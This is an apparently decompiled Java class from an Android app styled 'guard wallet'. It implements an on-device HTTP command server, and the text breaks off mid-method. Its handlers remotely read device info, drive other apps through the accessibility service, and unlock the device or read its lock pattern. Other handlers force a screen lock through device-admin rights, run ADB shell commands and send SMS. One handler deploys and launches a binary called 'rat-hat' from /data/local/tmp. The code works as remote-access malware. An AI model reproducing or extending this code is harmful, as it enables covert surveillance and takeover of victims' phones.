package com.guard.wallet.server;

import a0.C0002b;
import a1.AbstractC0026q;
import android.accounts.AccountManager;
import android.app.ActivityManager;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.graphics.Rect;
import android.os.Build;
import android.provider.Settings;
import android.support.v4.content.ContextCompat;
import android.support.v4.os.EnvironmentCompat;
import android.telephony.SmsManager;
import android.util.Log;
import com.google.json.Gson;
import com.google.json.reflect.TypeToken;
import com.guard.wallet.MainApplication;
import com.guard.wallet.condition.GlobalActionCondition;
import com.guard.wallet.condition.TargetActionCondition;
import com.guard.wallet.entity.ADBConfig;
import com.guard.wallet.entity.AdbShellResult;
import com.guard.wallet.entity.CheckPortResult;
import com.guard.wallet.entity.CommandResult;
import com.guard.wallet.entity.Point;
import com.guard.wallet.entity.TakeScreenShotResult;
import com.guard.wallet.entity.UiObject;
import com.guard.wallet.entity.UiObjectCollection;
import com.guard.wallet.filter.CombineFilter;
import com.guard.wallet.filter.CombineFilterWithChild;
import com.guard.wallet.filter.CombineFilterWithUpLevel;
import com.guard.wallet.filter.CombineFiltersWithOr;
import com.guard.wallet.helper.AbstractC0184g;
import com.guard.wallet.helper.AbstractC0191n;
import com.guard.wallet.http.AbstractC0207l;
import com.guard.wallet.http.C0203h;
import com.guard.wallet.http.C0204i;
import com.guard.wallet.http.C0217v;
import com.guard.wallet.receiver.CustomAdminReceiver;
import com.guard.wallet.req.AdminAdminActivatingVO;
import com.guard.wallet.req.BatteryLevelVO;
import com.guard.wallet.req.BlockViewVO;
import com.guard.wallet.req.ContainerEventVO;
import com.guard.wallet.req.DeviceCipherStateVO;
import com.guard.wallet.req.ListenWindow;
import com.guard.wallet.req.LockPatternVO;
import com.guard.wallet.req.MatchListenWindowVO;
import com.guard.wallet.req.MessageRecordVO;
import com.guard.wallet.req.NavigateWifiSettingDialogVO;
import com.guard.wallet.req.NetStateVO;
import com.guard.wallet.req.NotificationDialogVO;
import com.guard.wallet.req.PermissionRequestVO;
import com.guard.wallet.req.QueryAgentFileVO;
import com.guard.wallet.req.ReqADBPairVO;
import com.guard.wallet.req.ReqAdbInstallVO;
import com.guard.wallet.req.ReqAdbShellVO;
import com.guard.wallet.req.ReqDeleteFileVO;
import com.guard.wallet.req.ReqDownloadFileVO;
import com.guard.wallet.req.ReqMonitorLocationVO;
import com.guard.wallet.req.ReqSendSMSVO;
import com.guard.wallet.req.ReqStartApp;
import com.guard.wallet.req.ReqUnlockDeviceVO;
import com.guard.wallet.req.RequestCommand;
import com.guard.wallet.req.ScreenMetricsVO;
import com.guard.wallet.req.TouchEvent;
import com.guard.wallet.resp.ApiResult;
import com.guard.wallet.resp.BackAppStateVO;
import com.guard.wallet.resp.CallStateVO;
import com.guard.wallet.resp.DeviceAdminVO;
import com.guard.wallet.resp.DeviceInfoVO;
import com.guard.wallet.resp.DevicePairStateVO;
import com.guard.wallet.resp.MainUninstallPolicyVO;
import com.guard.wallet.resp.MessageGroupVO;
import com.guard.wallet.resp.PairResponseVO;
import com.guard.wallet.resp.PermissionsBodyVO;
import com.guard.wallet.resp.PowerControlStateVO;
import com.guard.wallet.resp.ResStartApp;
import com.guard.wallet.resp.RespDeleteFileVO;
import com.guard.wallet.resp.RespDownloadFileVO;
import com.guard.wallet.resp.SearchNodeListResultVO;
import com.guard.wallet.resp.SearchNodeResultVO;
import com.guard.wallet.service.CustomNotificationService;
import com.guard.wallet.service.MyAccessibilityService;
import com.guard.wallet.thread.AbstractC0243l;
import com.guard.wallet.thread.C0241j;
import com.guard.wallet.thread.CallableC0242k;
import com.guard.wallet.thread.CallableC0244m;
import com.guard.wallet.utils.AbstractC0248d;
import com.guard.wallet.utils.AbstractC0249e;
import com.guard.wallet.utils.AbstractC0251g;
import com.guard.wallet.utils.AbstractC0252h;
import f0.C0282c;
import f0.C0289j;
import f0.C0292m;
import f0.RunnableC0283d;
import i0.C0334e;
import java.lang.reflect.Type;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.LinkedList;
import java.util.List;
import java.util.Objects;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.atomic.AtomicInteger;
import l0.AbstractC0381k;
import l0.C0375e;
import l0.C0376f;
import l0.InterfaceC0385o;
import l0.RunnableC0379i;
import org.bouncycastle.asn1.eac.CertificateBody;
import org.bouncycastle.asn1.eac.EACTags;
import org.bouncycastle.i18n.TextBundle;
import org.bouncycastle.pqc.math.linearalgebra.Matrix;
import org.bouncycastle.tls.CipherSuite;
import org.bouncycastle.tls.NamedGroup;
import com.guard.wallet.entity.BuildConfig;
import p002e.C0262b;
import p005h.C0318e;
import p007j.C0349d;
import p007j.C0350e;
import p007j.EnumC0348c;
import p010m.C0397d;
import p012o.C0416e;
import p012o.C0420i;
import p012o.C0429r;
import p012o.C0435x;
import p012o.g0;
import p013p.AbstractC0857b;
import p014r.AbstractC0888a;
import p014r.EnumC0890c;
import p015s.C0896a;
import p017u.C0918a;
import p018v.C0927a;
import p018v.C0929c;
import p019w.AbstractC0956a;
import p022z.C0980c;
import p022z.C0981d;

/* renamed from: com.guard.wallet.server.b */
/* loaded from: classes.dex */
public final class C0230b implements InterfaceC0385o {

    /* renamed from: b */
    public static volatile C0230b f291b;

    /* renamed from: c */
    public static final AtomicInteger f292c = new AtomicInteger(-1);

    /* renamed from: a */
    public final C0376f f293a = new C0376f();

    /* renamed from: A */
    public static void m459A(AbstractC0381k abstractC0381k) {
        try {
            ApiResult apiResult = new ApiResult();
            apiResult.setData(AbstractC0252h.m708l("deviceId"));
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setCount(1);
            apiResult.setSuccess(Boolean.TRUE);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    public static void A0(String str, String str2, String str3, int i2, AbstractC0381k abstractC0381k) {
        SearchNodeResultVO searchNodeResultVO;
        UiObject m1074m;
        try {
            C0416e o12 = o1(str);
            if (m508x(o12, abstractC0381k)) {
                return;
            }
            if (o12 == null || AbstractC0026q.m151B(str2)) {
                m500p(abstractC0381k, "你提交的参数有误,委托ID、关键字不能为空");
                return;
            }
            try {
                m1074m = o12.m1074m(i2, str3);
            } catch (Exception e2) {
                AbstractC0026q.m186s("AccessibilityDelegate", e2);
            }
            if (!AbstractC0026q.m151B(str2) && m1074m != null) {
                searchNodeResultVO = o12.m1059D(m1074m.findLastByTextStartsWith(str2));
                ApiResult apiResult = new ApiResult();
                apiResult.setData(searchNodeResultVO);
                apiResult.setCode(200);
                apiResult.setMsg("OK");
                apiResult.setCount(1);
                apiResult.setSuccess(Boolean.TRUE);
                String m693N = AbstractC0252h.m693N(apiResult);
                abstractC0381k.f771l = apiResult.getCode().intValue();
                abstractC0381k.m952h(m693N);
                abstractC0381k.mo787l();
            }
            searchNodeResultVO = null;
            ApiResult apiResult2 = new ApiResult();
            apiResult2.setData(searchNodeResultVO);
            apiResult2.setCode(200);
            apiResult2.setMsg("OK");
            apiResult2.setCount(1);
            apiResult2.setSuccess(Boolean.TRUE);
            String m693N2 = AbstractC0252h.m693N(apiResult2);
            abstractC0381k.f771l = apiResult2.getCode().intValue();
            abstractC0381k.m952h(m693N2);
            abstractC0381k.mo787l();
        } catch (Exception e3) {
            AbstractC0026q.m186s("HttpServer", e3);
        }
    }

    public static void A1(AbstractC0381k abstractC0381k, String str) {
        try {
            AdbShellResult adbShellResult = new AdbShellResult();
            ApiResult apiResult = new ApiResult();
            if (C0318e.m844S() != null && C0318e.m844S().mo302D()) {
                C0318e.m844S().m856O(str);
            }
            adbShellResult.setSuccess(false);
            apiResult.setData(adbShellResult);
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setCount(1);
            apiResult.setSuccess(Boolean.TRUE);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    public static void A2(CombineFilterWithChild combineFilterWithChild, AbstractC0381k abstractC0381k) {
        SearchNodeResultVO searchNodeResultVO;
        UiObject m1075n;
        if (combineFilterWithChild != null) {
            try {
                if (combineFilterWithChild.getParentFilter() != null) {
                    C0416e o12 = o1(combineFilterWithChild.getParentFilter().getDelegateId());
                    if (m508x(o12, abstractC0381k)) {
                        return;
                    }
                    if (o12 != null) {
                        try {
                        } catch (Exception e2) {
                            AbstractC0026q.m186s("AccessibilityDelegate", e2);
                        }
                        if (combineFilterWithChild.getParentFilter() != null && (m1075n = o12.m1075n(combineFilterWithChild.getParentFilter())) != null) {
                            searchNodeResultVO = o12.m1059D(m1075n.scrollForwardUtil(new C0980c(combineFilterWithChild, 0)));
                            ApiResult apiResult = new ApiResult();
                            apiResult.setData(searchNodeResultVO);
                            apiResult.setCode(200);
                            apiResult.setMsg("OK");
                            apiResult.setCount(1);
                            apiResult.setSuccess(Boolean.TRUE);
                            String m693N = AbstractC0252h.m693N(apiResult);
                            abstractC0381k.f771l = apiResult.getCode().intValue();
                            abstractC0381k.m952h(m693N);
                            abstractC0381k.mo787l();
                            return;
                        }
                        searchNodeResultVO = null;
                        ApiResult apiResult2 = new ApiResult();
                        apiResult2.setData(searchNodeResultVO);
                        apiResult2.setCode(200);
                        apiResult2.setMsg("OK");
                        apiResult2.setCount(1);
                        apiResult2.setSuccess(Boolean.TRUE);
                        String m693N2 = AbstractC0252h.m693N(apiResult2);
                        abstractC0381k.f771l = apiResult2.getCode().intValue();
                        abstractC0381k.m952h(m693N2);
                        abstractC0381k.mo787l();
                        return;
                    }
                }
            } catch (Exception e3) {
                AbstractC0026q.m186s("HttpServer", e3);
                return;
            }
        }
        m500p(abstractC0381k, "你提交的参数有误,委托ID、遍历参数不能为空");
    }

    public static void A3(ReqUnlockDeviceVO reqUnlockDeviceVO, AbstractC0381k abstractC0381k) {
        try {
            ApiResult apiResult = new ApiResult();
            apiResult.setData(Boolean.valueOf(AbstractC0251g.p1(reqUnlockDeviceVO)));
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setCount(1);
            apiResult.setSuccess(Boolean.TRUE);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    /* renamed from: B */
    public static void m460B(AbstractC0381k abstractC0381k) {
        try {
            DeviceInfoVO of = DeviceInfoVO.of();
            ApiResult apiResult = new ApiResult();
            apiResult.setData(of);
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setCount(1);
            apiResult.setSuccess(Boolean.TRUE);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    public static void B0(String str, String str2, String str3, int i2, AbstractC0381k abstractC0381k) {
        SearchNodeResultVO searchNodeResultVO;
        UiObject m1074m;
        try {
            C0416e o12 = o1(str);
            if (m508x(o12, abstractC0381k)) {
                return;
            }
            if (o12 == null || AbstractC0026q.m151B(str2)) {
                m500p(abstractC0381k, "你提交的参数有误,委托ID、关键字不能为空");
                return;
            }
            try {
                m1074m = o12.m1074m(i2, str3);
            } catch (Exception e2) {
                AbstractC0026q.m186s("AccessibilityDelegate", e2);
            }
            if (!AbstractC0026q.m151B(str2) && m1074m != null) {
                searchNodeResultVO = o12.m1059D(m1074m.findOneByClassName(str2));
                ApiResult apiResult = new ApiResult();
                apiResult.setData(searchNodeResultVO);
                apiResult.setCode(200);
                apiResult.setMsg("OK");
                apiResult.setCount(1);
                apiResult.setSuccess(Boolean.TRUE);
                String m693N = AbstractC0252h.m693N(apiResult);
                abstractC0381k.f771l = apiResult.getCode().intValue();
                abstractC0381k.m952h(m693N);
                abstractC0381k.mo787l();
            }
            searchNodeResultVO = null;
            ApiResult apiResult2 = new ApiResult();
            apiResult2.setData(searchNodeResultVO);
            apiResult2.setCode(200);
            apiResult2.setMsg("OK");
            apiResult2.setCount(1);
            apiResult2.setSuccess(Boolean.TRUE);
            String m693N2 = AbstractC0252h.m693N(apiResult2);
            abstractC0381k.f771l = apiResult2.getCode().intValue();
            abstractC0381k.m952h(m693N2);
            abstractC0381k.mo787l();
        } catch (Exception e3) {
            AbstractC0026q.m186s("HttpServer", e3);
        }
    }

    public static void B1(AbstractC0381k abstractC0381k, String str) {
        try {
            ApiResult apiResult = new ApiResult();
            if (AbstractC0026q.m153D(str)) {
                int parseInt = Integer.parseInt(str);
                int[] m1326b = AbstractC0888a.m1326b(4);
                int length = m1326b.length;
                int i2 = 0;
                int i3 = 0;
                while (true) {
                    if (i3 >= length) {
                        break;
                    }
                    int i4 = m1326b[i3];
                    if (AbstractC0888a.m1325a(i4) == parseInt) {
                        i2 = i4;
                        break;
                    }
                    i3++;
                }
                if (i2 != 0 && AbstractC0252h.m683D(Integer.valueOf(AbstractC0888a.m1325a(i2)), "backAppInstalled")) {
                    apiResult.setData(Boolean.TRUE);
                    apiResult.setCount(1);
                }
            }
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setSuccess(Boolean.TRUE);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    public static void B2(CombineFilter combineFilter, AbstractC0381k abstractC0381k) {
        SearchNodeResultVO searchNodeResultVO;
        UiObject m1075n;
        if (combineFilter != null) {
            try {
                C0416e o12 = o1(combineFilter.getDelegateId());
                if (m508x(o12, abstractC0381k)) {
                    return;
                }
                if (o12 != null) {
                    try {
                        m1075n = o12.m1075n(combineFilter);
                    } catch (Exception e2) {
                        AbstractC0026q.m186s("AccessibilityDelegate", e2);
                    }
                    if (m1075n != null) {
                        searchNodeResultVO = o12.m1059D(m1075n.scrollForwardUtil(new C0981d(combineFilter, 0)));
                        ApiResult apiResult = new ApiResult();
                        apiResult.setData(searchNodeResultVO);
                        apiResult.setCode(200);
                        apiResult.setMsg("OK");
                        apiResult.setCount(1);
                        apiResult.setSuccess(Boolean.TRUE);
                        String m693N = AbstractC0252h.m693N(apiResult);
                        abstractC0381k.f771l = apiResult.getCode().intValue();
                        abstractC0381k.m952h(m693N);
                        abstractC0381k.mo787l();
                        return;
                    }
                    searchNodeResultVO = null;
                    ApiResult apiResult2 = new ApiResult();
                    apiResult2.setData(searchNodeResultVO);
                    apiResult2.setCode(200);
                    apiResult2.setMsg("OK");
                    apiResult2.setCount(1);
                    apiResult2.setSuccess(Boolean.TRUE);
                    String m693N2 = AbstractC0252h.m693N(apiResult2);
                    abstractC0381k.f771l = apiResult2.getCode().intValue();
                    abstractC0381k.m952h(m693N2);
                    abstractC0381k.mo787l();
                    return;
                }
            } catch (Exception e3) {
                AbstractC0026q.m186s("HttpServer", e3);
                return;
            }
        }
        m500p(abstractC0381k, "你提交的参数有误,委托ID、遍历参数不能为空");
    }

    public static void B3(AbstractC0381k abstractC0381k) {
        try {
            String str = "armeabi";
            String[] strArr = Build.SUPPORTED_ABIS;
            boolean z2 = false;
            if (strArr != null && strArr.length > 0) {
                str = strArr[0];
            }
            String m605c = AbstractC0248d.m605c();
            String concat = m605c.concat("/").concat(str).concat("/").concat(AbstractC0248d.m606d());
            if (C0318e.m844S() != null && C0318e.m844S().mo302D()) {
                z2 = C0318e.m844S().m850I(null, concat, "rat-hat", "/data/local/tmp/rat-hat server --stop ; nohup /data/local/tmp/rat-hat server -d > /dev/null &");
            }
            ApiResult apiResult = new ApiResult();
            apiResult.setSuccess(Boolean.TRUE);
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setData(Boolean.valueOf(z2));
            apiResult.setCount(1);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    /* renamed from: C */
    public static void m461C(AbstractC0381k abstractC0381k) {
        try {
            boolean m636I = AbstractC0251g.m636I();
            ApiResult apiResult = new ApiResult();
            apiResult.setData(Boolean.valueOf(m636I));
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setCount(1);
            apiResult.setSuccess(Boolean.TRUE);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    public static void C0(String str, String str2, String str3, int i2, AbstractC0381k abstractC0381k) {
        SearchNodeResultVO searchNodeResultVO;
        UiObject m1074m;
        try {
            C0416e o12 = o1(str);
            if (m508x(o12, abstractC0381k)) {
                return;
            }
            if (o12 == null || AbstractC0026q.m151B(str2)) {
                m500p(abstractC0381k, "你提交的参数有误,委托ID、关键字不能为空");
                return;
            }
            try {
                m1074m = o12.m1074m(i2, str3);
            } catch (Exception e2) {
                AbstractC0026q.m186s("AccessibilityDelegate", e2);
            }
            if (!AbstractC0026q.m151B(str2) && m1074m != null) {
                searchNodeResultVO = o12.m1059D(m1074m.findOneByClassNameContains(str2));
                ApiResult apiResult = new ApiResult();
                apiResult.setData(searchNodeResultVO);
                apiResult.setCode(200);
                apiResult.setMsg("OK");
                apiResult.setCount(1);
                apiResult.setSuccess(Boolean.TRUE);
                String m693N = AbstractC0252h.m693N(apiResult);
                abstractC0381k.f771l = apiResult.getCode().intValue();
                abstractC0381k.m952h(m693N);
            }
            searchNodeResultVO = null;
            ApiResult apiResult2 = new ApiResult();
            apiResult2.setData(searchNodeResultVO);
            apiResult2.setCode(200);
            apiResult2.setMsg("OK");
            apiResult2.setCount(1);
            apiResult2.setSuccess(Boolean.TRUE);
            String m693N2 = AbstractC0252h.m693N(apiResult2);
            abstractC0381k.f771l = apiResult2.getCode().intValue();
            abstractC0381k.m952h(m693N2);
        } catch (Exception e3) {
            AbstractC0026q.m186s("HttpServer", e3);
        }
    }

    public static void C1(AbstractC0381k abstractC0381k) {
        Boolean bool;
        try {
            ApiResult apiResult = new ApiResult();
            if (C0318e.m844S() != null) {
                apiResult.setData(C0318e.m844S().m854M());
                apiResult.setCount(1);
                apiResult.setCode(200);
                apiResult.setMsg("OK");
                bool = Boolean.TRUE;
            } else {
                apiResult.setCount(0);
                apiResult.setCode(204);
                apiResult.setMsg("No Content");
                bool = Boolean.FALSE;
            }
            apiResult.setSuccess(bool);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    public static void C2(CombineFiltersWithOr combineFiltersWithOr, AbstractC0381k abstractC0381k) {
        SearchNodeResultVO searchNodeResultVO;
        UiObject m1074m;
        if (combineFiltersWithOr != null) {
            try {
                C0416e o12 = o1(combineFiltersWithOr.getDelegateId());
                if (m508x(o12, abstractC0381k)) {
                    return;
                }
                if (o12 != null) {
                    try {
                        m1074m = o12.m1074m(combineFiltersWithOr.getTarget(), combineFiltersWithOr.getResUnique());
                    } catch (Exception e2) {
                        AbstractC0026q.m186s("AccessibilityDelegate", e2);
                    }
                    if (m1074m != null) {
                        searchNodeResultVO = o12.m1059D(m1074m.scrollForwardUtil(new C0981d(combineFiltersWithOr, 1)));
                        ApiResult apiResult = new ApiResult();
                        apiResult.setData(searchNodeResultVO);
                        apiResult.setCode(200);
                        apiResult.setMsg("OK");
                        apiResult.setCount(1);
                        apiResult.setSuccess(Boolean.TRUE);
                        String m693N = AbstractC0252h.m693N(apiResult);
                        abstractC0381k.f771l = apiResult.getCode().intValue();
                        abstractC0381k.m952h(m693N);
                        abstractC0381k.mo787l();
                        return;
                    }
                    searchNodeResultVO = null;
                    ApiResult apiResult2 = new ApiResult();
                    apiResult2.setData(searchNodeResultVO);
                    apiResult2.setCode(200);
                    apiResult2.setMsg("OK");
                    apiResult2.setCount(1);
                    apiResult2.setSuccess(Boolean.TRUE);
                    String m693N2 = AbstractC0252h.m693N(apiResult2);
                    abstractC0381k.f771l = apiResult2.getCode().intValue();
                    abstractC0381k.m952h(m693N2);
                    abstractC0381k.mo787l();
                    return;
                }
            } catch (Exception e3) {
                AbstractC0026q.m186s("HttpServer", e3);
                return;
            }
        }
        m500p(abstractC0381k, "你提交的参数有误,委托ID、遍历参数不能为空");
    }

    /* renamed from: D */
    public static void m462D(AbstractC0381k abstractC0381k) {
        try {
            boolean m638K = AbstractC0251g.m638K();
            ApiResult apiResult = new ApiResult();
            apiResult.setData(Boolean.valueOf(m638K));
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setCount(1);
            apiResult.setSuccess(Boolean.TRUE);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    public static void D0(String str, String str2, String str3, int i2, AbstractC0381k abstractC0381k) {
        SearchNodeResultVO searchNodeResultVO;
        UiObject m1074m;
        try {
            C0416e o12 = o1(str);
            if (m508x(o12, abstractC0381k)) {
                return;
            }
            if (o12 == null || AbstractC0026q.m151B(str2)) {
                m500p(abstractC0381k, "你提交的参数有误,委托ID、关键字不能为空");
                return;
            }
            try {
                m1074m = o12.m1074m(i2, str3);
            } catch (Exception e2) {
                AbstractC0026q.m186s("AccessibilityDelegate", e2);
            }
            if (!AbstractC0026q.m151B(str2) && m1074m != null) {
                searchNodeResultVO = o12.m1059D(m1074m.findOneByClassNameEndsWith(str2));
                ApiResult apiResult = new ApiResult();
                apiResult.setData(searchNodeResultVO);
                apiResult.setCode(200);
                apiResult.setMsg("OK");
                apiResult.setCount(1);
                apiResult.setSuccess(Boolean.TRUE);
                String m693N = AbstractC0252h.m693N(apiResult);
                abstractC0381k.f771l = apiResult.getCode().intValue();
                abstractC0381k.m952h(m693N);
                abstractC0381k.mo787l();
            }
            searchNodeResultVO = null;
            ApiResult apiResult2 = new ApiResult();
            apiResult2.setData(searchNodeResultVO);
            apiResult2.setCode(200);
            apiResult2.setMsg("OK");
            apiResult2.setCount(1);
            apiResult2.setSuccess(Boolean.TRUE);
            String m693N2 = AbstractC0252h.m693N(apiResult2);
            abstractC0381k.f771l = apiResult2.getCode().intValue();
            abstractC0381k.m952h(m693N2);
            abstractC0381k.mo787l();
        } catch (Exception e3) {
            AbstractC0026q.m186s("HttpServer", e3);
        }
    }

    public static void D1(AbstractC0381k abstractC0381k) {
        boolean z2;
        try {
            if (Build.VERSION.SDK_INT >= 28) {
                z2 = AbstractC0251g.F0(8);
            } else {
                if (AbstractC0251g.m653Z() != null) {
                    DevicePolicyManager devicePolicyManager = (DevicePolicyManager) AbstractC0251g.m653Z().getSystemService("device_policy");
                    if (devicePolicyManager.isAdminActive(new ComponentName(AbstractC0251g.m653Z(), (Class<?>) CustomAdminReceiver.class))) {
                        devicePolicyManager.lockNow();
                        z2 = true;
                    }
                }
                z2 = false;
            }
            ApiResult apiResult = new ApiResult();
            apiResult.setData(Boolean.valueOf(z2));
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setCount(1);
            apiResult.setSuccess(Boolean.TRUE);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    public static void D2(CombineFilterWithChild combineFilterWithChild, AbstractC0381k abstractC0381k) {
        SearchNodeResultVO searchNodeResultVO;
        UiObject m1075n;
        if (combineFilterWithChild != null) {
            try {
                if (combineFilterWithChild.getParentFilter() != null) {
                    C0416e o12 = o1(combineFilterWithChild.getParentFilter().getDelegateId());
                    if (m508x(o12, abstractC0381k)) {
                        return;
                    }
                    if (o12 != null) {
                        try {
                        } catch (Exception e2) {
                            AbstractC0026q.m186s("AccessibilityDelegate", e2);
                        }
                        if (combineFilterWithChild.getParentFilter() != null && (m1075n = o12.m1075n(combineFilterWithChild.getParentFilter())) != null) {
                            searchNodeResultVO = o12.m1059D(m1075n.scrollForwardUtil(new C0980c(combineFilterWithChild, 1)));
                            ApiResult apiResult = new ApiResult();
                            apiResult.setData(searchNodeResultVO);
                            apiResult.setCode(200);
                            apiResult.setMsg("OK");
                            apiResult.setCount(1);
                            apiResult.setSuccess(Boolean.TRUE);
                            String m693N = AbstractC0252h.m693N(apiResult);
                            abstractC0381k.f771l = apiResult.getCode().intValue();
                            abstractC0381k.m952h(m693N);
                            abstractC0381k.mo787l();
                            return;
                        }
                        searchNodeResultVO = null;
                        ApiResult apiResult2 = new ApiResult();
                        apiResult2.setData(searchNodeResultVO);
                        apiResult2.setCode(200);
                        apiResult2.setMsg("OK");
                        apiResult2.setCount(1);
                        apiResult2.setSuccess(Boolean.TRUE);
                        String m693N2 = AbstractC0252h.m693N(apiResult2);
                        abstractC0381k.f771l = apiResult2.getCode().intValue();
                        abstractC0381k.m952h(m693N2);
                        abstractC0381k.mo787l();
                        return;
                    }
                }
            } catch (Exception e3) {
                AbstractC0026q.m186s("HttpServer", e3);
                return;
            }
        }
        m500p(abstractC0381k, "你提交的参数有误,委托ID、遍历参数不能为空");
    }

    public static void D3(AbstractC0381k abstractC0381k) {
        try {
            ApiResult apiResult = new ApiResult();
            apiResult.setData("AsyncHttpServer 2.1.1");
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setCount(1);
            apiResult.setSuccess(Boolean.TRUE);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    /* renamed from: E */
    public static void m463E(AbstractC0381k abstractC0381k) {
        try {
            boolean m637J = AbstractC0251g.m637J();
            ApiResult apiResult = new ApiResult();
            apiResult.setData(Boolean.valueOf(m637J));
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setCount(1);
            apiResult.setSuccess(Boolean.TRUE);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    public static void E0(String str, String str2, String str3, int i2, AbstractC0381k abstractC0381k) {
        SearchNodeResultVO searchNodeResultVO;
        UiObject m1074m;
        try {
            C0416e o12 = o1(str);
            if (m508x(o12, abstractC0381k)) {
                return;
            }
            if (o12 == null || AbstractC0026q.m151B(str2)) {
                m500p(abstractC0381k, "你提交的参数有误,委托ID、关键字不能为空");
                return;
            }
            try {
                m1074m = o12.m1074m(i2, str3);
            } catch (Exception e2) {
                AbstractC0026q.m186s("AccessibilityDelegate", e2);
            }
            if (!AbstractC0026q.m151B(str2) && m1074m != null) {
                searchNodeResultVO = o12.m1059D(m1074m.findOneByClassNameMatches(str2));
                ApiResult apiResult = new ApiResult();
                apiResult.setData(searchNodeResultVO);
                apiResult.setCode(200);
                apiResult.setMsg("OK");
                apiResult.setCount(1);
                apiResult.setSuccess(Boolean.TRUE);
                String m693N = AbstractC0252h.m693N(apiResult);
                abstractC0381k.f771l = apiResult.getCode().intValue();
                abstractC0381k.m952h(m693N);
                abstractC0381k.mo787l();
            }
            searchNodeResultVO = null;
            ApiResult apiResult2 = new ApiResult();
            apiResult2.setData(searchNodeResultVO);
            apiResult2.setCode(200);
            apiResult2.setMsg("OK");
            apiResult2.setCount(1);
            apiResult2.setSuccess(Boolean.TRUE);
            String m693N2 = AbstractC0252h.m693N(apiResult2);
            abstractC0381k.f771l = apiResult2.getCode().intValue();
            abstractC0381k.m952h(m693N2);
            abstractC0381k.mo787l();
        } catch (Exception e3) {
            AbstractC0026q.m186s("HttpServer", e3);
        }
    }

    public static void E1(AbstractC0381k abstractC0381k) {
        try {
            LockPatternVO B0 = AbstractC0251g.B0();
            ApiResult apiResult = new ApiResult();
            apiResult.setData(B0);
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setCount(1);
            apiResult.setSuccess(Boolean.TRUE);
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    public static void E2(String str, String str2, AbstractC0381k abstractC0381k) {
        SmsManager smsManager;
        ArrayList<String> divideMessage;
        try {
            if (AbstractC0026q.m151B(str) || AbstractC0026q.m151B(str2)) {
                m500p(abstractC0381k, "你提交的参数有错误、或参数不合法,详见参数错误明细");
                return;
            }
            boolean z2 = false;
            if (AbstractC0251g.m653Z() != null && ContextCompat.checkSelfPermission(AbstractC0251g.m653Z(), "android.permission.SEND_SMS") == 0 && (divideMessage = (smsManager = SmsManager.getDefault()).divideMessage(str2)) != null && !divideMessage.isEmpty()) {
                Iterator<String> it = divideMessage.iterator();
                while (it.hasNext()) {
